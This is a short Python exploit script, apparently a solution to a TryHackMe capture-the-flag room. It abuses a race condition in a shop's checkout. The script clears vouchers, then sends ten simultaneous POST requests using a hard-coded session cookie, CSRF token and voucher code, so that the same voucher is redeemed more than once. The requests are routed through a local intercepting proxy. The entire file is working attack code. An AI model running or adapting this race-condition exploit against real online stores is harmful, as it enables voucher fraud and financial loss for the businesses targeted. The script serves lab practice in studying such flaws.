#!/usr/bin/env python3S
import requests
import threading

target_ip = "10.10.141.221"

def clear_voucher():
	requests.get(f"http://{target_ip}/clear-vouchers")

def send_voucher():
	r = requests.post(f"http://{target_ip}/checkout", cookies={"session":"eyJjc3JmX3Rva2VuIjoiMzE1YzhmMzUyMzQ0YzQwMjc4M2NmZjM4NGNkYTIxZWJiOTU1NmQzMyJ9.ZiGAwQ.Rc4wRaK10IcnVvTsFXiwnr1kt84"}, data={"csrf_token":"IjMxNWM4ZjM1MjM0NGM0MDI3ODNjZmYzODRjZGEyMWViYjk1NTZkMzMi.ZiGAwQ.gQhCcy_Cs-HsZz-RFA98TyY587U","name":"jxf","voucher_code":"TRYHACK3M","submit":"Checkout"}, proxies={"http":"http://127.0.0.1:8080"})

clear_voucher()

threads = []
for i in range(0, 10):
	threads.append(threading.Thread(target=send_voucher))

for thread in threads:
	thread.start()

for thread in threads:
	thread.join()
